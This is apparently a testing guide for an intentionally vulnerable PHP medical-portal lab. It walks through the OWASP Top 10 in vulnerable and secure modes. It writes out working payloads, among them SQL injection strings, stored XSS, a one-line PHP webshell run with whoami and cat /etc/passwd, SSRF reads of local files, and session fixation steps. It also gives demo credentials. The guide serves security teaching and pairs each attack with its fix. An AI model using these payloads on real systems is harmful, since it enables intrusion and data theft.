
# Testing Guide

Step-by-step instructions for testing every OWASP vulnerability in the portal. Each section tells you exactly what to do, what you should see when it works, and what changes when you flip `SECURE_MODE = true`.

All tests assume you're running on Arch Linux with Apache + MariaDB as described in `README.md`, and that you're starting with `SECURE_MODE = false` in `config.php`.

> [!tip]
> You don't need to restart `httpd` after changing configuration or code

---

## Before You Start

1. Confirm the app is running at `http://localhost`.
2. Confirm you can log in as `alice@demo.com` / `password123`.
3. Keep `config.php` open in your editor - you'll toggle `SECURE_MODE` repeatedly.
4. Use Firefox or Chromium. Keep DevTools open (F12 → Network + Console tabs).

---

## A01 - Broken Access Control (IDOR)

**File:** `patient/records.php`

### Vulnerable

1. Log in as Alice (`alice@demo.com` / `password123`).
2. Navigate to **My Records**. You see Alice's medical record.
3. Look at the URL - it loads your own record by default.
4. Change the URL to: `http://localhost/patient/records.php?patient_id=2`
5. You now see **Bob's** full medical record (DOB, blood type, allergies, notes) without any authorization check.

### Secure

1. Set `SECURE_MODE = true` in `config.php`.
2. Repeat step 4 above.
3. You get a **403 Access Denied** response. The server checks that `$_SESSION['user_id']` matches the requested `patient_id`.

---

## A02 - Cryptographic Failures (MD5 Passwords)

**File:** `auth/register.php`, `auth/login.php`

### Vulnerable

1. Open a MySQL shell:
   ```bash
   mysql -u root -p medicare
   ```
2. Run:
   ```sql
   SELECT email, password FROM users;
   ```
3. All passwords are stored as 32-character MD5 hashes. MD5 is trivially reversible via rainbow tables - paste any hash into an online MD5 lookup and the plaintext comes back instantly.

### Secure

1. Set `SECURE_MODE = true`.
2. Register a new account through the UI at `/auth/register.php`.
3. Check the database again:
   ```sql
   SELECT email, password FROM users ORDER BY id DESC LIMIT 1;
   ```
4. The new account's password is a bcrypt hash (starts with `$2y$`), which is salted and computationally expensive to crack.

**Note:** The seed accounts still have MD5 hashes. In secure mode, login uses `password_verify()` against bcrypt, so the seed accounts won't work unless you re-register them or manually update their hashes.

---

## A03 - SQL Injection

**File:** `shared/search.php`

### Vulnerable

1. Log in as any user.
2. Go to **Find a Doctor**.
3. In the search box, type:
   ```
   ' OR '1'='1
   ```
4. Hit Search.
5. The query becomes `SELECT * FROM users WHERE role='doctor' AND name LIKE '%' OR '1'='1%'` - which returns **every row** in the `users` table, including emails and MD5 password hashes.

You can also try more targeted payloads:
```
' UNION SELECT 1,2,3,4,5,6 -- -
```

### Secure

1. Set `SECURE_MODE = true`.
2. Repeat the same injection.
3. The search returns zero results. The input is bound as a parameter via PDO prepared statements, so the `'` is treated as a literal character. The secure query also only returns `id`, `name`, and `email` - no password hashes.

---

## A03 - Cross-Site Scripting (XSS)

**File:** `patient/chat.php`, `doctor/chat.php`

### Vulnerable

1. Log in as Alice (`alice@demo.com`).
2. Go to **Messages**.
3. Select Dr. Smith and send this message:
   ```
   <script>alert('XSS')</script>
   ```
4. The page reloads and a JavaScript alert box pops up. The script tag was stored in the database and rendered as raw HTML.
5. Now log in as Dr. Smith (`drsmith@demo.com` / `password123`), go to Messages, and click Alice. The alert fires again - this is **stored XSS** that hits every user who views the conversation.

You can also try:
```
<img src=x onerror="alert(document.cookie)">
```

### Secure

1. Set `SECURE_MODE = true`.
2. Send the same payload.
3. The message renders as visible text: `<script>alert('XSS')</script>`. The `htmlspecialchars()` function escapes `<` and `>` so the browser treats it as text, not markup.

---

## A04 - Insecure Design

**File:** `patient/appointments.php`

### Vulnerable

1. Log in as Alice.
2. Go to **Appointments**.
3. Book the same time slot repeatedly - there's no conflict check. You can book 50 appointments on the same date.
4. You can also book any doctor at any time, even times that are already taken.

### Secure

1. Set `SECURE_MODE = true`.
2. Try to book a slot that already exists - you get: "That time slot is already taken."
3. Try to book more than 3 appointments on the same day - you get: "You cannot book more than 3 appointments per day."

---

## A05 - Security Misconfiguration

**Files:** `.htaccess`, Apache config, PHP error handling

### Vulnerable

1. With `SECURE_MODE = false`, trigger a database error. The easiest way: temporarily change `DB_NAME` in `config.php` to a database that doesn't exist, then load any page.
2. You'll see a full PDO exception with the database name, host, and stack trace displayed to the user.
3. Navigate to `http://localhost/db/` - if `Options -Indexes` isn't working, you'll see directory listings exposing `schema.sql`.

### Secure

1. Set `SECURE_MODE = true` and trigger the same error.
2. The user sees a generic "An error occurred" message. No stack trace, no database details.
3. In a production setup, you'd also set `display_errors = Off` in `php.ini` and restrict directory access via `.htaccess`.

---

## A06 - Vulnerable Components

**File:** `composer.json`

This one is a reference demo, not a runtime exploit.

1. Open `composer.json` and note the dependency:
   ```json
   "phpmailer/phpmailer": "5.2.23"
   ```
2. This version has **CVE-2016-10033** (remote code execution via mail header injection).
3. If you've installed Composer, run:
   ```bash
   composer install
   composer audit
   ```
4. The audit will flag the known vulnerability.
5. The fix: update to PHPMailer 6.x+ and verify with `composer audit` showing zero advisories.

---

## A07 - Authentication & Session Failures

**File:** `auth/login.php`

### Vulnerable

1. Open DevTools → Application → Cookies.
2. Note the `PHPSESSID` cookie value.
3. Log in as Alice.
4. Check the cookie again - **the session ID is the same**. It was not regenerated on login, making session fixation attacks possible.

To demonstrate fixation:
1. Visit the login page. Copy your `PHPSESSID`.
2. In a second browser/incognito window, manually set a cookie: `PHPSESSID=<copied_value>`.
3. Go back to the first browser and log in.
4. Refresh the second browser - you're now logged in as Alice using the pre-set session ID.

### Secure

1. Set `SECURE_MODE = true`.
2. Note the `PHPSESSID` before login.
3. Log in.
4. The session ID changes - `session_regenerate_id(true)` was called, which invalidates the old session and issues a new ID. The fixation attack no longer works.

---

## A08 - Unrestricted File Upload (Webshell)

**File:** `shared/upload.php`

### Vulnerable

1. Create a test PHP file on your machine:
   ```bash
   echo '<?php echo shell_exec($_GET["cmd"]); ?>' > /tmp/shell.php
   ```
2. Log in as any user. Go to **Upload File**.
3. Upload `shell.php`.
4. After upload, the page shows a link to the file. Click it, or navigate directly to:
   ```
   http://localhost/uploads/shell.php?cmd=whoami
   ```
5. You see the output of `whoami` - the PHP file executed on the server. You now have arbitrary command execution.

Try other commands:
```
http://localhost/uploads/shell.php?cmd=cat /etc/passwd
http://localhost/uploads/shell.php?cmd=ls -la /
```

### Secure

1. Set `SECURE_MODE = true`.
2. Try uploading `shell.php` again.
3. You get: "Invalid file type. Only PDF, JPEG, and PNG are allowed."
4. The server checks the actual MIME type using `finfo`, not just the file extension. Even if you rename `shell.php` to `shell.pdf`, the MIME check catches it.
5. Valid uploads get renamed to a random hex string with the correct extension, preventing execution.

---

## A09 - Logging & Monitoring Failures

**File:** `admin/audit_log.php`

### Vulnerable

1. Log in as Admin (`admin@demo.com` / `admin123`).
2. Go to **Audit Log**.
3. The table is empty. Perform several actions: log in/out, view patient records, upload files, search doctors.
4. Check the audit log again - still empty. No actions are being recorded.

### Secure

1. Set `SECURE_MODE = true`.
2. Log out and log back in as Admin.
3. Perform the same actions.
4. Go to the Audit Log - every login, record access, search, upload, and message is now recorded with the user, action, IP address, and timestamp.

---

## A10 - Server-Side Request Forgery (SSRF)

**File:** `shared/insurance_fetch.php`

### Vulnerable

1. Log in as any user. Go to **Insurance Verification** (via the sidebar under "Upload File" isn't it - look for the URL directly: `http://localhost/shared/insurance_fetch.php`).
2. In the URL field, enter:
   ```
   http://localhost/config.php
   ```
3. Hit Fetch. The server reads `config.php` via `file_get_contents()` and dumps the full source code - including database credentials - into the response.
4. Try:
   ```
   file:///etc/passwd
   ```
5. You get the contents of `/etc/passwd`. The server can be used as a proxy to reach internal services and read local files.

### Secure

1. Set `SECURE_MODE = true`.
2. Try the same URLs.
3. You get: "URL not permitted. Only approved insurance provider domains are allowed."
4. Even if you somehow match the domain whitelist, the server checks the resolved IP against private ranges (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) and blocks them.

---

## Quick Test Cycle

For rapid demo iterations:

```bash
# Edit SECURE_MODE
nano /path/to/medicare-portal/config.php

# Reset the database (wipes all data, re-seeds accounts)
mysql -u root -p < /path/to/medicare-portal/db/schema.sql
```

No server restart needed after changing `config.php` - PHP reads it fresh on every request.

---

## Troubleshooting

**"Connection refused" or blank page:**
- Check Apache is running: `sudo systemctl status httpd`
- Check PHP errors: `sudo journalctl -u httpd -f`
- Verify `pdo_mysql` extension is enabled in `/etc/php/php.ini`

**"Access denied" from MySQL:**
- Verify credentials in `config.php` match what you set during `mariadb-secure-installation`
- Test manually: `mysql -u root -p medicare -e "SELECT 1"`

**Uploads don't execute (A08 test fails):**
- You must use Apache, not `php -S`. The built-in PHP server doesn't execute uploaded `.php` files from the uploads directory the same way.
- Check that `uploads/.htaccess` is **not** blocking PHP execution (in vulnerable mode, it shouldn't be).

**Session fixation test (A07) not working:**
- Make sure you're using two separate browser profiles or one regular + one incognito window. Tabs in the same browser share the same cookie jar.

**XSS alert doesn't fire:**
- If you're using a browser with built-in XSS protection (some Chromium builds), try Firefox instead - it doesn't filter reflected/stored XSS by default.
- Verify `SECURE_MODE = false` in `config.php`.

---
